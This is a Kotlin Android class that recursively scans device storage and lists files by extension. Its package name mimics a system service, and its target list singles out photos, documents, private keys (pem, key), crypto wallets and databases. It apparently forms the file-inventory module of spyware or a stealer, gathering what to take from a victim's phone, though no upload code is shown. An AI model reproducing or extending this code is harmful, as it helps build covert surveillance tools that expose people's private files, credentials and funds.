// [context: Kotlin, Android API 26+, recursive file scanner with MIME filter]
package com.system.service.modules.files

import android.content.Context
import android.os.Environment
import org.json.JSONArray
import org.json.JSONObject
import java.io.File

class FileScanner(private val context: Context) {

    private val interestingExts = setOf(
        "jpg","jpeg","png","mp4","mov","pdf","doc","docx","xls","xlsx",
        "ppt","pptx","txt","csv","zip","apk","key","pem","wallet","db"
    )

    fun scanExternal(path: String? = null): JSONArray {
        val root = path?.let { File(it) }
            ?: Environment.getExternalStorageDirectory()
        val arr = JSONArray()
        scan(root, arr, depth = 0)
        return arr
    }

    fun scanInternal(): JSONArray {
        val arr = JSONArray()
        scan(context.filesDir, arr, depth = 0)
        return arr
    }

    private fun scan(dir: File, arr: JSONArray, depth: Int) {
        if (depth > 6) return
        if (!dir.exists() || !dir.canRead()) return
        dir.listFiles()?.forEach { f ->
            if (f.isDirectory) {
                scan(f, arr, depth + 1)
            } else if (f.extension.lowercase() in interestingExts) {
                arr.put(JSONObject().apply {
                    put("path", f.absolutePath)
                    put("name", f.name)
                    put("size", f.length())
                    put("modified", f.lastModified())
                    put("ext", f.extension)
                })
            }
        }
    }
}
